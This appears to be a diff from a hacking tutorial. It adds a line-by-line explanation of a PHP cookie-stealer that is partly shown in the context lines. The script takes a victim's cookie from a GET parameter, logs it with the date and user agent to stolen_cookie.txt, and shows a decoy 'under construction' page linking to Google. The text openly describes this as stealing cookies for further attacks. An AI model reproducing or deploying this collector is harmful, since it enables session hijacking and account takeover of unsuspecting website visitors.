@@ -8,3 +8,25 @@ fclose($file);
 echo '<b>Sorry , this page is under construction</b></br></br>Please Click<a
 href="http://www.google.com/">here</a> to go back to previous page ';
 ?>
+
+So lets understand what the script will do :
+$collectedCookie=$HTTP_GET_VARS["cookie"];
+in this line we will store the data that is stored in a get variable called cookie then
+store it in avariable called collectedCookie
+$date=date("l ds of F Y h:i:s A");
+here we store the date of the connection Occurs , it tells us when these cookies have been
+stolen.
+
+$user_agent=$_SERVER['HTTP_USER_AGENT'];
+here we store the user_agent of the victim for further attacks if it needs to.
+$file=fopen('stolen_cookie.txt','a');
+here we create a file called stolen_cookie.txt that has victim's cookie information
+fwrite($file,"DATE:$date || USER AGENT:$user_agent || COOKIE:$collectedCookie \n");
+here we save the data as this format (“DATE: || USER AGENT || COOKIE”)
+fclose($file);
+her we close the file handle
+echo '<b>Sorry , this page is under construction</b></br></br>Please Click<a
+href="http://www.google.com/">here</a> to go back to previous page ';
+here we print message on the screen (“Sorry , this page is under construction”)
+and give him a link to click on it that send it to google.
+Here we have finished the first filecthat will collect the cookie information
